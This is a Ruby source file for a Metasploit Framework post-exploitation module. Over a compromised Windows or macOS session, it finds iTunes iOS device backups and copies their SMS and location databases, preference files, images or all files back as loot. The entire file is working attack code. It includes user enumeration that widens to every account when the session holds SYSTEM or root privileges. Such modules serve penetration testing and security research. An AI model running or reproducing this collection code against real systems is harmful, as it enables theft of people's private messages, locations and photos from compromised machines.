##
# $Id: apple_ios_backup.rb 14175 2011-11-06 22:02:26Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
#
# The script is updated on 19th-Aug-2012 to support iOS 5 backups : by Satish B
##

require 'msf/core'
require 'msf/core/post/file'
require 'rex/parser/apple_backup_manifestdb'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Windows Gather Apple iOS MobileSync Backup File Collection',
			'Description'    => %q{ This module will collect sensitive files from any on-disk iOS device backups },
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'hdm',
					'Satishb3',#http://www.securitylearn.net
					'bannedit' # Based on bannedit's pidgin_cred module structure
				],
			'Version'        => '$Revision: 14175 $',
			'Platform'       => ['windows'],
			'SessionTypes'   => ['meterpreter' ]
		))
		register_options(
			[
				OptBool.new('DATABASES',  [false, 'Collect all database files? (SMS, Location, etc)', true]),
				OptBool.new('PLISTS', [false, 'Collect all preference list files?', true]),
				OptBool.new('IMAGES', [false, 'Collect all image files?', false]),
				OptBool.new('EVERYTHING', [false, 'Collect all stored files? (SLOW)', false])
			], self.class)
	end

	#
	# Even though iTunes is only Windows and Mac OS X, look for the MobileSync files on all platforms
	#
	#
	def run
		case session.platform
		when /osx/
			@platform = :osx
			paths = enum_users_unix
		when /win/
			@platform = :windows
			drive = session.fs.file.expand_path("%SystemDrive%")
			os = session.sys.config.sysinfo['OS']

			if os =~ /Windows 7|Vista|2008/
				@appdata = '\\AppData\\Roaming'
				@users = drive + '\\Users'
			else
				@appdata = '\\Application Data'
				@users = drive + '\\Documents and Settings'
			end

			if session.type != "meterpreter"
				print_error "Only meterpreter sessions are supported on windows hosts"
				return
			end
			paths = enum_users_windows
		else
			print_error "Unsupported platform #{session.platform}"
			return
		end

		if paths.empty?
			print_status("No users found with an iTunes backup directory")
			return
		end

		process_backups(paths)
	end

	def process_backups(paths)
		paths.each {|path| process_backup(path) }
	end

	def process_backup(path)
		print_status("Pulling data from #{path}...")

		mbdb_data = ""
		
		print_status("Reading Manifest.mbdb from #{path}...")
		if session.type == "shell"
			mbdb_data = session.shell_command("cat #{path}/Manifest.mbdb")
		else
			mfd = session.fs.file.new("#{path}\\Manifest.mbdb", "rb")
			until mfd.eof?
				mbdb_data << mfd.read
			end
			mfd.close
		end

		manifest = Rex::Parser::AppleBackupManifestDB.new(mbdb_data)
		patterns = []
		patterns << /\.db$/i if datastore['DATABASES']
		patterns << /\.plist$/i if datastore['PLISTS']
		patterns << /\.(jpeg|jpg|png|bmp|tiff|gif)$/i if datastore['IMAGES']
		patterns << /.*/ if datastore['EVERYTHING']

		done = {}
		patterns.each do |pat|
			manifest.entry_offsets.each_pair do |fname,info|
				next if done[fname]
				next if not info[:filename].to_s =~ pat

				print_status("Downloading #{info[:domain]} #{info[:filename]}...")

				begin
				fdata = ""
				if session.type == "shell"
					fdata = session.shell_command("cat #{path}/#{fname}")
				else
					mfd = session.fs.file.new("#{path}\\#{fname}", "rb")
					until mfd.eof?
						fdata << mfd.read
					end
					mfd.close
				end
				bname = info[:filename] || "unknown.bin"
				rname = info[:domain].to_s + "_" + bname
				rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '').gsub(/_+/, "_")
				ctype = "application/octet-stream"

				store_loot("ios.backup.data", ctype, session, fdata, rname, "iOS Backup: #{rname}")

				rescue ::Interrupt
					raise $!
				rescue ::Exception => e
					print_error("Failed to download #{fname}: #{e.class} #{e}")
				end

				done[fname] = true
			end
		end
	end

	def enum_users_unix
		if @platform == :osx
			home = "/Users/"
		else
			home = "/home/"
		end

		if got_root?
			userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
			userdirs << "/root\n"
		else
			userdirs = session.shell_command("ls #{home}#{whoami}/Library/Application\\ Support/MobileSync/Backup/")
			if userdirs =~ /No such file/i
				return
			else
				print_status("Found backup directory for: #{whoami}")
				return ["#{home}#{whoami}/Library/Application\\ Support/MobileSync/Backup/"]
			end
		end

		paths = Array.new
		userdirs.each_line do |dir|
			dir.chomp!
			next if dir == "." || dir == ".."

			dir = "#{home}#{dir}" if dir !~ /root/
			print_status("Checking for backup directory in: #{dir}")

			stat = session.shell_command("ls #{dir}/Library/Application\\ Support/MobileSync/Backup/")
			next if stat =~ /No such file/i
			paths << "#{dir}/Library/Application\\ Support/MobileSync/Backup/"
		end
		return paths
	end

	def enum_users_windows
		paths = Array.new

		if got_root?
			begin
				session.fs.dir.foreach(@users) do |path|
					next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/i
					bdir = "#{@users}\\#{path}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
					dirs = check_for_backups_win(bdir)
					dirs.each { |dir| paths << dir } if dirs
				end
			rescue ::Rex::Post::Meterpreter::RequestError
				# Handle the case of the @users base directory is not accessible
			end
		else
			print_status "Only checking #{whoami} account since we do not have SYSTEM..."
			path = "#{@users}\\#{whoami}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
			dirs = check_for_backups_win(path)
			dirs.each { |dir| paths << dir } if dirs
		end
		return paths
	end

	def got_root?
		case @platform
		when :windows
			if session.sys.config.getuid =~ /SYSTEM/
				return true
			else
				return false
			end
		else # unix, bsd, linux, osx
			ret = whoami
			if ret =~ /root/
				return true
			else
				return false
			end
		end
	end


	def check_for_backups_win(bdir)
		dirs = []
		begin
				print_status("Checking for backups in #{bdir}")
				session.fs.dir.foreach(bdir) do |dir|
				if dir =~ /^[0-9a-f]{16}/i
					print_status("Found #{bdir}\\#{dir}")
					dirs << "#{bdir}\\#{dir}"
				end
			end
		rescue Rex::Post::Meterpreter::RequestError
			# Handle base directories that do not exist
		end
		dirs
	end

	def whoami
		if @platform == :windows
			session.fs.file.expand_path("%USERNAME%")
		else
			session.shell_command("whoami").chomp
		end
	end

end